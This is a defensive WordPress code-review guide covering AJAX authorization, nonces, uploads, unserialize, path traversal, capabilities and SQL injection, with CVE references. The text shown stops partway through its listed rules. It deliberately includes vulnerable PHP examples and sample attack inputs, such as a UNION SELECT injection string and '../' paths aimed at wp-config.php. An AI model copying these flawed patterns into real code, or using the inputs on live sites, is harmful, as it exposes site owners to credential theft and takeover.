# BeforeMerge: wordpress-review

Comprehensive code review knowledge base for WordPress plugin and theme development. Contains rules across security, performance, architecture, and quality categories. Each rule includes detailed explanations, real-world examples comparing incorrect vs. correct PHP implementations, impact ratings, and formal weakness mappings (CWE/OWASP) to guide both AI agents and human reviewers.

## Table of Contents

### 1. Security Anti-Patterns (CRITICAL)
- 1. Secure AJAX Handlers with Nonce and Capability Checks — CRITICAL [CWE-862]
- 2. Verify Nonces on All State-Changing Actions — CRITICAL [CWE-352]
- 3. Guard Plugin and Theme PHP Files Against Direct Access — HIGH [CWE-425]
- 4. Use wp_handle_upload() with MIME Allowlists for File Uploads — HIGH [CWE-434]
- 5. Never Unserialize User-Controlled Data — CRITICAL [CWE-502]
- 6. Prevent Path Traversal in File Operations and Includes — CRITICAL [CWE-22]
- 7. Always Check Capabilities Before Privileged Operations — CRITICAL [CWE-862]
- 8. Always Use $wpdb->prepare() for Database Queries — CRITICAL [CWE-89]
- 9. Escape All Output with the Correct Context Function — CRITICAL [CWE-79]
### 2. Performance Patterns (HIGH)
- 10. Disable Autoload for Large or Infrequently Used Options — HIGH
- 11. Avoid N+1 Queries in Post Loops — HIGH
- 12. Use Object Cache for Repeated Expensive Queries — MEDIUM
- 13. Enqueue Scripts and Styles Properly with Conditional Loading — HIGH
- 14. Keep Database Queries Out of Templates — Use pre_get_posts — HIGH
- 15. Cache Expensive Operations with Transients — HIGH
### 3. Architecture Patterns (MEDIUM)
- 16. Use WordPress Path and URL Functions — Never Hardcode — MEDIUM
- 17. Use the Correct WordPress Hook for Each Operation — MEDIUM
- 18. Use WordPress APIs Instead of Raw PHP Functions — MEDIUM
### 4. Code Quality (LOW-MEDIUM)
- 19. Make All User-Facing Strings Translatable — MEDIUM
- 20. Sanitize All User Input with Type-Appropriate Functions — HIGH [CWE-20]
- 21. Use WP_Error for Error Handling — Not Exceptions or False — MEDIUM

---

## Rules

## Secure AJAX Handlers with Nonce and Capability Checks

**Impact: CRITICAL (prevents unauthorized data access and modification through AJAX endpoints)**

WordPress AJAX handlers registered via `wp_ajax_{action}` fire for **any** logged-in user — subscribers, contributors, authors, editors, and admins alike. A subscriber can call any `wp_ajax_` handler. `wp_ajax_nopriv_{action}` fires for unauthenticated visitors. Without explicit nonce and capability checks, these are open endpoints.

CVE-2024-9061 (WP Popup Builder) demonstrated this: a `wp_ajax_nopriv_` handler executed arbitrary shortcodes for unauthenticated users because it had no authorization checks.

**Incorrect (no security checks):**

```php
// ❌ Any logged-in user (including subscribers) can delete posts
add_action( 'wp_ajax_delete_post', function() {
    $post_id = $_POST['post_id'];
    wp_delete_post( $post_id, true );
    wp_send_json_success();
});

// ❌ Unauthenticated users can read private data
add_action( 'wp_ajax_nopriv_get_user_data', function() {
    $user_id = $_POST['user_id'];
    $user = get_userdata( $user_id );
    wp_send_json( [
        'email' => $user->user_email,
        'name'  => $user->display_name,
    ]); // Leaks PII to anyone
});

// ❌ Nonce checked but no capability check — subscriber can still trigger this
add_action( 'wp_ajax_update_settings', function() {
    check_ajax_referer( 'settings_nonce', 'nonce' );
    update_option( 'my_setting', $_POST['value'] ); // Any role can change settings!
    wp_send_json_success();
});
```

**Correct (nonce + capability + sanitization):**

```php
// ✅ Complete AJAX handler pattern
add_action( 'wp_ajax_delete_post', function() {
    // 1. Verify nonce (dies on failure)
    check_ajax_referer( 'my_plugin_delete_nonce', 'nonce' );

    // 2. Verify capability
    if ( ! current_user_can( 'delete_posts' ) ) {
        wp_send_json_error( 'Insufficient permissions.', 403 );
    }

    // 3. Sanitize input
    $post_id = absint( $_POST['post_id'] );
    if ( ! $post_id ) {
        wp_send_json_error( 'Invalid post ID.', 400 );
    }

    // 4. Verify ownership or admin status for extra safety
    $post = get_post( $post_id );
    if ( ! $post || ( $post->post_author !== get_current_user_id() && ! current_user_can( 'delete_others_posts' ) ) ) {
        wp_send_json_error( 'Not authorized for this post.', 403 );
    }

    wp_delete_post( $post_id, true );
    wp_send_json_success( [ 'deleted' => $post_id ] );
});
```

```php
// ✅ JavaScript side: pass the nonce with the AJAX request
// In PHP (enqueue):
wp_enqueue_script( 'my-plugin-admin', plugin_dir_url( __FILE__ ) . 'admin.js', [ 'jquery' ], '1.0', true );
wp_localize_script( 'my-plugin-admin', 'myPlugin', [
    'ajaxUrl' => admin_url( 'admin-ajax.php' ),
    'nonce'   => wp_create_nonce( 'my_plugin_delete_nonce' ),
]);

// In JavaScript:
fetch(myPlugin.ajaxUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
        action: 'delete_post',
        nonce: myPlugin.nonce,
        post_id: postId,
    }),
});
```

```php
// ✅ For handlers that MUST be available to unauthenticated users,
// limit scope and validate input strictly
add_action( 'wp_ajax_nopriv_contact_form', function() {
    check_ajax_referer( 'contact_form_nonce', 'nonce' );

    $email   = sanitize_email( wp_unslash( $_POST['email'] ) );
    $message = sanitize_textarea_field( wp_unslash( $_POST['message'] ) );

    if ( ! is_email( $email ) || empty( $message ) ) {
        wp_send_json_error( 'Invalid input.', 400 );
    }

    // Rate limit (see sec-rate-limiting patterns)
    wp_mail( get_option( 'admin_email' ), 'Contact Form', $message );
    wp_send_json_success();
});
```

**AJAX security checklist:**

| Check | Function | Purpose |
|-------|----------|---------|
| CSRF protection | `check_ajax_referer()` | Verifies request came from your site |
| Authorization | `current_user_can()` | Verifies user has the right role/capability |
| Input sanitization | `absint()`, `sanitize_text_field()`, etc. | Prevents injection |
| Response format | `wp_send_json_success/error()` | Consistent, safe JSON output |

**Detection hints:**

```bash
# Find AJAX handlers without nonce checks
grep -rn "wp_ajax_" wp-content/plugins/ --include="*.php" -l | xargs grep -L "check_ajax_referer\|wp_verify_nonce"
# Find AJAX handlers without capability checks
grep -rn "wp_ajax_" wp-content/plugins/ --include="*.php" -l | xargs grep -L "current_user_can"
# Find nopriv handlers (extra scrutiny needed)
grep -rn "wp_ajax_nopriv_" wp-content/plugins/ --include="*.php"
```

Reference: [WordPress AJAX in Plugins](https://developer.wordpress.org/plugins/javascript/ajax/) · [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

---

## Verify Nonces on All State-Changing Actions

**Impact: CRITICAL (prevents cross-site request forgery enabling unauthorized settings changes and data modification)**

WordPress nonces are time-limited tokens that verify a request originated from your site, not a malicious third-party page. Without nonce verification, an attacker can craft a page that submits forms or triggers actions on behalf of a logged-in WordPress admin who visits the attacker's site.

**Every form handler, admin action, and AJAX callback that modifies data must:**
1. Generate a nonce in the form/request
2. Verify the nonce before processing
3. Also check `current_user_can()` — nonces alone don't verify authorization

**Incorrect (no nonce verification):**

```php
// ❌ Form handler with no CSRF protection
add_action( 'admin_post_save_settings', function() {
    update_option( 'my_plugin_api_key', $_POST['api_key'] );
    wp_redirect( admin_url( 'options-general.php?page=my-plugin' ) );
    exit;
});

// ❌ Checking nonce exists but not verifying its value
add_action( 'admin_post_delete_item', function() {
    if ( isset( $_POST['_wpnonce'] ) ) {
        // Still vulnerable! Never verified the nonce value
        wp_delete_post( $_POST['post_id'], true );
    }
});

// ❌ Nonce verified but no capability check — any logged-in user can trigger this
add_action( 'admin_post_promote_user', function() {
    check_admin_referer( 'promote_user_nonce' );
    // Missing: current_user_can() check!
    wp_update_user([ 'ID' => $_POST['user_id'], 'role' => 'administrator' ]);
});
```

**Correct (nonce generation + verification + capability check):**

```php
// Step 1: Generate nonce in the form
function render_settings_form() {
    ?>
    <form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
        <input type="hidden" name="action" value="save_settings">
        <?php wp_nonce_field( 'my_plugin_save_settings', '_wpnonce' ); ?>

        <input type="text" name="api_key"
               value="<?php echo esc_attr( get_option( 'my_plugin_api_key' ) ); ?>">
        <?php submit_button(); ?>
    </form>
    <?php
}

// Step 2: Verify nonce + capability in the handler
add_action( 'admin_post_save_settings', function() {
    // Verify nonce — dies automatically on failure
    check_admin_referer( 'my_plugin_save_settings' );

    // Verify capability — nonce alone is not authorization
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Unauthorized' );
    }

    // Sanitize input
    $api_key = sanitize_text_field( wp_unslash( $_POST['api_key'] ) );
    update_option( 'my_plugin_api_key', $api_key );

    wp_safe_redirect( admin_url( 'options-general.php?page=my-plugin&updated=1' ) );
    exit;
});
```

```php
// ✅ URL-based actions (e.g., "Delete" links in admin tables)
// Generate:
$delete_url = wp_nonce_url(
    admin_url( 'admin-post.php?action=delete_item&id=' . $item_id ),
    'delete_item_' . $item_id
);

// Verify:
add_action( 'admin_post_delete_item', function() {
    $item_id = absint( $_GET['id'] );
    check_admin_referer( 'delete_item_' . $item_id );

    if ( ! current_user_can( 'delete_posts' ) ) {
        wp_die( 'Unauthorized' );
    }

    wp_delete_post( $item_id, true );
    wp_safe_redirect( wp_get_referer() );
    exit;
});
```

**Nonce functions reference:**

| Purpose | Function |
|---------|----------|
| Generate hidden field in form | `wp_nonce_field( $action, $name )` |
| Generate nonce string (for JS) | `wp_create_nonce( $action )` |
| Add nonce to URL | `wp_nonce_url( $url, $action )` |
| Verify in admin context (dies on fail) | `check_admin_referer( $action )` |
| Verify in AJAX context (dies on fail) | `check_ajax_referer( $action, $name )` |
| Verify manually (returns false/1/2) | `wp_verify_nonce( $nonce, $action )` |

**Detection hints:**

```bash
# Find admin_post handlers without nonce checks
grep -rn "admin_post_" wp-content/plugins/ --include="*.php" -l | xargs grep -L "check_admin_referer\|wp_verify_nonce"
# Find POST handlers without nonce verification
grep -rn "\$_POST\[" wp-content/plugins/ --include="*.php" -l | xargs grep -L "nonce\|referer"
```

Reference: [WordPress Nonces](https://developer.wordpress.org/apis/security/nonces/) · [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

---

## Guard Plugin and Theme PHP Files Against Direct Access

**Impact: HIGH (prevents information disclosure and unguarded code execution from direct file requests)**

Every PHP file in a WordPress plugin or theme is directly accessible via URL unless protected. When accessed directly (e.g., `https://example.com/wp-content/plugins/my-plugin/includes/process.php`), the file executes without the WordPress bootstrap — no security checks, no authentication, no API functions loaded. This can:

- Reveal server paths and PHP versions in error messages
- Execute partial logic without nonce or capability verification
- Expose debug output or database credentials
- Allow direct invocation of file operations

**Incorrect (no access guard):**

```php
<?php
// wp-content/plugins/my-plugin/includes/helpers.php
// ❌ No guard — directly accessible via URL

function process_data( $input ) {
    global $wpdb;
    // Fatal error: $wpdb is null when accessed directly
    // Error message leaks server path and WordPress install location
    return $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->prefix}posts" );
}
```

```php
<?php
// ❌ File with initialization logic that runs on include
// Direct access triggers this without WordPress context
$config = include __DIR__ . '/config.php'; // May expose sensitive values
$db = new PDO( $config['dsn'] ); // Direct DB connection without WP safeguards
```

**Correct (ABSPATH guard at the top of every file):**

```php
<?php
// ✅ First executable line in every plugin/theme PHP file
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

function process_data( $input ) {
    global $wpdb;
    return $wpdb->get_var(
        $wpdb->prepare( "SELECT COUNT(*) FROM {$wpdb->prefix}posts WHERE post_status = %s", 'publish' )
    );
}
```

```php
<?php
// ✅ Alternative: check WPINC (defined in wp-settings.php)
defined( 'WPINC' ) || die;

// ✅ One-liner variant
defined( 'ABSPATH' ) || exit;
```

**Where the guard is required:**

- Every `.php` file in your plugin directory
- Every `.php` file in your theme directory
- Template files, class files, include files, helper files
- **Exception:** The main plugin file (the one with the `Plugin Name:` header) — WordPress loads this directly, so it should define its own constant or check ABSPATH early

**Detection hints:**

```bash
# Find PHP files missing ABSPATH guard
grep -rL "defined.*ABSPATH\|defined.*WPINC" wp-content/plugins/my-plugin/ --include="*.php" | grep -v "vendor\|node_modules"
```

Reference: [WordPress Plugin Security](https://developer.wordpress.org/plugins/security/) · [CWE-425: Direct Request](https://cwe.mitre.org/data/definitions/425.html)

---

## Use wp_handle_upload() with MIME Allowlists for File Uploads

**Impact: HIGH (prevents remote code execution and malicious file serving through unrestricted uploads)**

WordPress provides `wp_handle_upload()` which validates file extensions against the allowed MIME types, checks file content via `finfo`, generates unique filenames, and places files in the correct uploads directory. Using `move_uploaded_file()` directly bypasses all of these protections.

CVE-2024-43243 (JobBoard plugin) — `mime_content_type()` was the only check, allowing `.php` files disguised as images. CVE-2024-13342 (Booster for WooCommerce) — double-extension files bypassed the MIME whitelist.

**Incorrect (direct file handling):**

```php
// ❌ Only checks client-supplied MIME type (spoofable)
if ( $_FILES['upload']['type'] === 'image/jpeg' ) {
    move_uploaded_file(
        $_FILES['upload']['tmp_name'],
        WP_CONTENT_DIR . '/uploads/' . $_FILES['upload']['name'] // Original filename = path traversal risk
    );
}

// ❌ Blacklist approach (always incomplete)
$blacklist = [ 'php', 'php3', 'phtml', 'exe' ];
$ext = pathinfo( $_FILES['upload']['name'], PATHINFO_EXTENSION );
if ( ! in_array( strtolower( $ext ), $blacklist ) ) {
    move_uploaded_file( ... ); // pHP, php4, php7, phar, shtml all bypass this
}

// ❌ Using PHP's mime_content_type alone (checks content but not extension)
$mime = mime_content_type( $_FILES['upload']['tmp_name'] );
if ( strpos( $mime, 'image/' ) !== false ) {
    move_uploaded_file( $_FILES['upload']['tmp_name'], $dir . $_FILES['upload']['name'] );
    // shell.php with JPEG header bytes passes the content check!
}
```

**Correct (WordPress upload handler with MIME allowlist):**

```php
// ✅ Use wp_handle_upload() — validates extension + content + generates safe filename
function handle_file_upload() {
    check_admin_referer( 'my_plugin_upload' );

    if ( ! current_user_can( 'upload_files' ) ) {
        wp_die( 'Unauthorized' );
    }

    if ( empty( $_FILES['my_file'] ) ) {
        return new WP_Error( 'no_file', 'No file uploaded.' );
    }

    // Restrict to specific MIME types
    $overrides = [
        'test_form' => false, // Skip referer check (we already verified nonce)
        'mimes'     => [
            'jpg|jpeg|jpe' => 'image/jpeg',
            'png'          => 'image/png',
            'pdf'          => 'application/pdf',
        ],
    ];

    $result = wp_handle_upload( $_FILES['my_file'], $overrides );

    if ( isset( $result['error'] ) ) {
        return new WP_Error( 'upload_error', $result['error'] );
    }

    // $result contains: 'file' (path), 'url' (URL), 'type' (MIME)
    return $result;
}
```

```php
// ✅ To also register in the media library:
function handle_media_upload() {
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    require_once ABSPATH . 'wp-admin/includes/image.php';

    $attachment_id = media_handle_upload( 'my_file', 0, [], [
        'test_form' => false,
        'mimes'     => [
            'jpg|jpeg|jpe' => 'image/jpeg',
            'png'          => 'image/png',
        ],
    ]);

    if ( is_wp_error( $attachment_id ) ) {
        return $attachment_id;
    }

    return wp_get_attachment_url( $attachment_id );
}
```

```php
// ✅ Restrict global upload types for your plugin's context
add_filter( 'upload_mimes', function( $mimes ) {
    // Remove dangerous types
    unset( $mimes['svg'] );  // SVG can contain JavaScript
    unset( $mimes['swf'] );  // Flash (shouldn't exist but sometimes allowed)
    return $mimes;
});
```

**What `wp_handle_upload()` does that you shouldn't replicate:**

1. Validates file extension against the MIME allowlist
2. Checks file content via `finfo` (magic bytes) if available
3. Generates a unique filename via `wp_unique_filename()`
4. Moves the file to the correct `wp-content/uploads/YYYY/MM/` directory
5. Sets proper file permissions
6. Applies the `wp_handle_upload` filter for plugin extensions

**Detection hints:**

```bash
# Find direct move_uploaded_file (should use wp_handle_upload instead)
grep -rn "move_uploaded_file" wp-content/plugins/ --include="*.php"
# Find $_FILES usage without WordPress upload functions
grep -rn "\$_FILES" wp-content/plugins/ --include="*.php" -l | xargs grep -L "wp_handle_upload\|media_handle_upload"
```

Reference: [wp_handle_upload()](https://developer.wordpress.org/reference/functions/wp_handle_upload/) · [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)

---

## Never Unserialize User-Controlled Data

**Impact: CRITICAL (prevents remote code execution through PHP object injection and gadget chain exploitation)**

PHP's `unserialize()` reconstructs objects from a serialized string, invoking magic methods (`__wakeup`, `__destruct`, `__toString`) on the instantiated classes. In a WordPress environment, the large number of loaded classes from core, plugins, and themes creates an extensive "gadget chain" surface. An attacker who controls the serialized string can chain these magic methods to achieve arbitrary file read/write, file deletion, or remote code execution.

CVE-2024-5932 (GiveWP, CVSS 10.0) — unauthenticated PHP object injection via a POST parameter, leading to RCE. CVE-2024-10957 (UpdraftPlus, 3M+ installs) — object injection allowing unauthenticated file deletion and data exfiltration.

**Incorrect (deserializing user-controlled data):**

```php
// ❌ Unserializing cookie data — attacker controls the cookie value
$prefs = unserialize( base64_decode( $_COOKIE['user_prefs'] ) );

// ❌ maybe_unserialize() on POST data — same vulnerability
$config = maybe_unserialize( $_POST['config_data'] );
// maybe_unserialize() calls unserialize() internally when it detects serialized format

// ❌ Unserializing data from a user-editable field
$cached = get_user_meta( $user_id, 'cached_data', true );
$data = unserialize( $cached );
// If a user can set their own meta (via profile form), this is exploitable

// ❌ Accepting serialized data in a REST API endpoint
function handle_import( WP_REST_Request $request ) {
    $data = unserialize( $request->get_param( 'payload' ) );
    process_import( $data );
}
```

**Correct (use JSON or let WordPress handle serialization internally):**

```php
// ✅ Use JSON for data interchange — not deserializable into objects
$prefs = json_decode( stripslashes( $_COOKIE['user_prefs'] ), true );
if ( ! is_array( $prefs ) ) {
    $prefs = []; // Default on invalid data
}

// ✅ Store structured data as arrays via WordPress APIs
// WordPress serializes/deserializes internally when storing arrays
update_user_meta( $user_id, 'preferences', [
    'theme' => 'dark',
    'notifications' => true,
]);
$prefs = get_user_meta( $user_id, 'preferences', true ); // Returns array

// ✅ For REST API imports, accept JSON
function handle_import( WP_REST_Request $request ) {
    $data = $request->get_json_params(); // Already parsed as array
    if ( ! is_array( $data ) ) {
        return new WP_Error( 'invalid_payload', 'Expected JSON array', [ 'status' => 400 ] );
    }
    process_import( $data );
}

// ✅ If you must handle serialized data from trusted internal sources,
// validate the source is truly not user-controllable
// NEVER unserialize data that a user could have influenced
```

**Key principles:**

1. **Never call `unserialize()` on user input** — `$_GET`, `$_POST`, `$_COOKIE`, `$_REQUEST`, or any data derived from them
2. **`maybe_unserialize()` is equally dangerous** — it calls `unserialize()` internally
3. **Use `json_encode()`/`json_decode()` for data interchange** — JSON cannot instantiate PHP objects
4. **Let WordPress handle serialization** — `update_option()`, `update_post_meta()`, `update_user_meta()` serialize arrays automatically and are safe when the stored value doesn't originate from raw user input
5. **Audit anywhere serialized data is stored** — if a user can control the value that gets serialized into the database, they can exploit it when it's unserialized

**Detection hints:**

```bash
# Find all unserialize calls
grep -rn "unserialize\s*(" wp-content/plugins/ --include="*.php"
# Find maybe_unserialize calls
grep -rn "maybe_unserialize\s*(" wp-content/plugins/ --include="*.php"
# Check if any are on user-controlled data
grep -rn "unserialize.*\\\$_\|maybe_unserialize.*\\\$_" wp-content/plugins/ --include="*.php"
```

Reference: [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) · [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

## Prevent Path Traversal in File Operations and Includes

**Impact: CRITICAL (arbitrary file read, write, or deletion on the server including wp-config.php)**

Any file operation that uses user-supplied input — `include`, `require`, `readfile`, `file_get_contents`, `unlink` — without path validation is vulnerable to traversal attacks. An attacker sends `../../wp-config.php` to read database credentials, or `../../.htaccess` to modify access rules.

CVE-2024-10470 (WPLMS theme, CVSS 9.8) — unauthenticated path traversal via a download parameter used directly in `readfile()` and `unlink()`, allowing attackers to delete `wp-config.php` and trigger a WordPress reinstall. CVE-2024-9047 (WordPress File Upload plugin) — unauthenticated file read and deletion via path traversal.

**Incorrect (user input in file paths):**

```php
// ❌ Template inclusion with user-controlled value
$template = $_GET['template'];
include WP_CONTENT_DIR . '/plugins/my-plugin/templates/' . $template . '.php';
// Attacker: ?template=../../../../wp-config → reads wp-config.php

// ❌ File download with user-supplied filename
$file = $_GET['download'];
$path = WP_CONTENT_DIR . '/uploads/' . $file;
if ( file_exists( $path ) ) {
    readfile( $path ); // Reads any file on the server
}

// ❌ File deletion with user input
$filename = $_POST['file'];
unlink( WP_CONTENT_DIR . '/exports/' . $filename );
// Attacker: file=../../../wp-config.php → deletes wp-config.php
```

**Correct (allowlist or realpath validation):**

```php
// ✅ Allowlist approach — only permit known values
$allowed_templates = [ 'header', 'footer', 'sidebar', 'content' ];
$template = sanitize_key( $_GET['template'] );

if ( ! in_array( $template, $allowed_templates, true ) ) {
    wp_die( 'Invalid template.' );
}

include WP_CONTENT_DIR . '/plugins/my-plugin/templates/' . $template . '.php';
```

```php
// ✅ Realpath validation — verify the resolved path stays within allowed directory
$base_dir  = realpath( WP_CONTENT_DIR . '/uploads/exports/' );
$requested = sanitize_file_name( $_GET['download'] );
$full_path = realpath( $base_dir . '/' . $requested );

// Three checks: path resolved, is within base dir, file exists
if ( false === $full_path || 0 !== strpos( $full_path, $base_dir . DIRECTORY_SEPARATOR ) ) {
    wp_die( 'Access denied.' );
}

if ( ! is_file( $full_path ) ) {
    wp_die( 'File not found.' );
}

// Safe to serve
header( 'Content-Type: application/octet-stream' );
header( 'Content-Disposition: attachment; filename="' . basename( $full_path ) . '"' );
readfile( $full_path );
exit;
```

```php
// ✅ sanitize_file_name() strips path separators and dangerous characters
$filename = sanitize_file_name( $_POST['file'] );
// "../../wp-config.php" becomes "wp-config.php"
// But ALWAYS combine with realpath check for defense-in-depth

// ✅ For file deletion, use lookup table instead of user-supplied paths
$export_id = absint( $_POST['export_id'] );
$export = get_post( $export_id );

if ( ! $export || 'export' !== $export->post_type ) {
    wp_die( 'Invalid export.' );
}

$file_path = get_post_meta( $export_id, '_file_path', true );
if ( $file_path && file_exists( $file_path ) ) {
    wp_delete_file( $file_path ); // WordPress's safe file deletion
}
```

**Key defenses:**

1. **Allowlist** — restrict to known filenames; best for templates and includes
2. **`realpath()` + prefix check** — verify the resolved path is within the allowed directory
3. **`sanitize_file_name()`** — strips path separators (`/`, `\`, `..`) but use as defense-in-depth, not sole protection
4. **Lookup table** — map IDs to paths stored in the database; users never supply paths directly
5. **`wp_delete_file()`** — WordPress's safe deletion function with hooks for cleanup

**Detection hints:**

```bash
# Find include/require with user input
grep -rn "include.*\\\$_\|require.*\\\$_" wp-content/plugins/ --include="*.php"
# Find file operations with user input
grep -rn "readfile.*\\\$_\|file_get_contents.*\\\$_\|unlink.*\\\$_" wp-content/plugins/ --include="*.php"
# Find file operations without realpath validation
grep -rn "readfile\|file_get_contents" wp-content/plugins/ --include="*.php" | grep -v "realpath"
```

Reference: [sanitize_file_name()](https://developer.wordpress.org/reference/functions/sanitize_file_name/) · [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)

---

## Always Check Capabilities Before Privileged Operations

**Impact: CRITICAL (prevents privilege escalation allowing low-role users to perform admin-level operations)**

WordPress has a granular capability system (`manage_options`, `edit_posts`, `delete_users`, etc.) but it's **opt-in** — no function automatically enforces capabilities. Every REST API endpoint, admin handler, AJAX callback, and Server Action must explicitly call `current_user_can()` before performing privileged operations.

CVE-2024-10924 (Really Simple Security, CVSS 9.8, 4M installs) — authentication bypass via a REST endpoint that didn't properly verify user identity, allowing unauthenticated admin login. CVE-2024-8485 (REST API TO MiniProgram) — missing validation enabled unauthenticated user email update, leading to admin account takeover.

**Incorrect (missing capability checks):**

```php
// ❌ REST endpoint with no permission_callback — accessible to everyone
register_rest_route( 'myplugin/v1', '/settings', [
    'methods'  => 'POST',
    'callback' => function( WP_REST_Request $request ) {
        update_option( 'my_plugin_config', $request->get_json_params() );
        return new WP_REST_Response( 'Updated', 200 );
    },
    // Missing permission_callback entirely!
]);

// ❌ permission_callback returns true — same as no check
register_rest_route( 'myplugin/v1', '/users', [
    'methods'             => 'DELETE',
    'callback'            => 'delete_user_handler',
    'permission_callback' => '__return_true', // Anyone can delete users!
]);

// ❌ Admin page action without capability check
add_action( 'admin_init', function() {
    if ( isset( $_POST['action'] ) && $_POST['action'] === 'export_data' ) {
        // No current_user_can() — any logged-in user visiting wp-admin triggers this
        $data = export_all_user_data();
        send_csv_download( $data );
    }
});
```

**Correct (capability checks at every entry point):**

```php
// ✅ REST endpoint with proper permission_callback
register_rest_route( 'myplugin/v1', '/settings', [
    'methods'             => 'POST',
    'callback'            => function( WP_REST_Request $request ) {
        $params = $request->get_json_params();
        // Sanitize before saving
        update_option( 'my_plugin_config', array_map( 'sanitize_text_field', $params ) );
        return new WP_REST_Response( [ 'updated' => true ], 200 );
    },
    'permission_callback' => function() {
        return current_user_can( 'manage_options' );
    },
]);

// ✅ Object-level authorization (check ownership, not just role)
register_rest_route( 'myplugin/v1', '/posts/(?P<id>\d+)', [
    'methods'             => 'DELETE',
    'callback'            => function( WP_REST_Request $request ) {
        $post_id = absint( $request->get_param( 'id' ) );
        wp_delete_post( $post_id, true );
        return new WP_REST_Response( null, 204 );
    },
    'permission_callback' => function( WP_REST_Request $request ) {
        $post_id = absint( $request->get_param( 'id' ) );
        $post    = get_post( $post_id );

        if ( ! $post ) {
            return false;
        }

        // Authors can delete their own; editors/admins can delete any
        return current_user_can( 'delete_post', $post_id );
    },
]);

// ✅ Admin action with capability + nonce
add_action( 'admin_init', function() {
    if ( ! isset( $_POST['action'] ) || $_POST['action'] !== 'export_data' ) {
        return;
    }

    check_admin_referer( 'export_data_nonce' );

    if ( ! current_user_can( 'export' ) ) {
        wp_die( 'You do not have permission to export data.' );
    }

    $data = export_all_user_data();
    send_csv_download( $data );
});
```

**Common WordPress capabilities:**

| Capability | Who has it | Use for |
|-----------|-----------|---------|
| `manage_options` | Admins | Plugin settings, site config |
| `edit_posts` | Contributors+ | Creating/editing own posts |
| `edit_others_posts` | Editors+ | Editing any post |
| `delete_posts` | Contributors+ | Deleting own posts |
| `delete_others_posts` | Editors+ | Deleting any post |
| `upload_files` | Authors+ | Media uploads |
| `manage_categories` | Editors+ | Taxonomy management |
| `edit_users` | Admins | User management |
| `install_plugins` | Super Admins | Plugin installation |

**Detection hints:**

```bash
# Find REST routes without permission_callback
grep -rn "register_rest_route" wp-content/plugins/ --include="*.php" -A 10 | grep -B 5 "callback" | grep -L "permission_callback"
# Find REST routes with __return_true permission
grep -rn "permission_callback.*__return_true" wp-content/plugins/ --include="*.php"
# Find admin actions without capability checks
grep -rn "admin_post_\|admin_init" wp-content/plugins/ --include="*.php" -l | xargs grep -L "current_user_can"
```

Reference: [WordPress Roles and Capabilities](https://developer.wordpress.org/plugins/users/roles-and-capabilities/) · [REST API permission_callback](https://developer.wordpress.org/rest-api/extending-the-rest-api/adding-custom-endpoints/#permissions-callback) · [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

---

## Always Use $wpdb->prepare() for Database Queries

**Impact: CRITICAL (prevents SQL injection enabling full database read/write and potential server compromise)**

WordPress provides `$wpdb->prepare()` to safely parameterize SQL queries. Any query that includes user-controlled values — `$_GET`, `$_POST`, function parameters, URL slugs — without `prepare()` is vulnerable to SQL injection. This is the #1 vulnerability class in WordPress plugins.

CVE-2024-27956 (WP Automatic plugin, CVSS 9.8) demonstrated unauthenticated SQL injection through direct query construction, allowing attackers to create admin accounts. CVE-2024-2879 (LayerSlider, CVSS 9.8) was another unauthenticated SQLi from the same pattern.

**Incorrect (user input in query strings):**

```php
// ❌ Direct variable interpolation — classic SQL injection
$id = $_GET['id'];
$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}users WHERE ID = $id" );
// Attacker sends: ?id=1 UNION SELECT user_login,user_pass FROM wp_users--

// ❌ String concatenation
$search = $_POST['search'];
$results = $wpdb->get_results(
    "SELECT * FROM {$wpdb->prefix}posts WHERE post_title LIKE '%" . $search . "%'"
);

// ❌ Variable inside prepare() string (not as a parameter)
$wpdb->query( $wpdb->prepare(
    "SELECT * FROM {$wpdb->prefix}posts WHERE post_status = %s AND ID = $id",
    'publish'
) );
// $id is still interpolated before prepare() sees it!

// ❌ Using sprintf instead of prepare (no escaping)
$sql = sprintf( "DELETE FROM %s WHERE id = %d", $wpdb->prefix . 'logs', $_GET['id'] );
$wpdb->query( $sql );
```

**Correct (all values through prepare()):**

```php
// ✅ Integer value: %d
$id = absint( $_GET['id'] ); // absint() as defense-in-depth
$result = $wpdb->get_row(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}users WHERE ID = %d",
        $id
    )
);

// ✅ String value: %s (auto-quoted and escaped)
$search = sanitize_text_field( $_POST['search'] );
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}posts WHERE post_title LIKE %s",
        '%' . $wpdb->esc_like( $search ) . '%'
    )
);

// ✅ Multiple values with mixed types
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}posts WHERE post_author = %d AND post_status = %s AND post_date > %s",
        $author_id,
        'publish',
        '2024-01-01'
    )
);

// ✅ Table/column identifiers: %i (WordPress 6.1+)
$column = sanitize_key( $_GET['sort_by'] );
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT ID, post_title FROM {$wpdb->prefix}posts ORDER BY %i DESC",
        $column
    )
);

// ✅ IN clause with array of IDs
$ids = array_map( 'absint', $_POST['ids'] );
$placeholders = implode( ',', array_fill( 0, count( $ids ), '%d' ) );
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}posts WHERE ID IN ($placeholders)",
        ...$ids
    )
);
```

**Placeholder reference:**

| Placeholder | Type | Example |
|-------------|------|---------|
| `%d` | Integer | `WHERE ID = %d` |
| `%s` | String (auto-quoted) | `WHERE name = %s` |
| `%f` | Float | `WHERE price = %f` |
| `%i` | Identifier (WP 6.1+) | `ORDER BY %i` |
| `%%` | Literal % | `LIKE '%%%s%%'` |

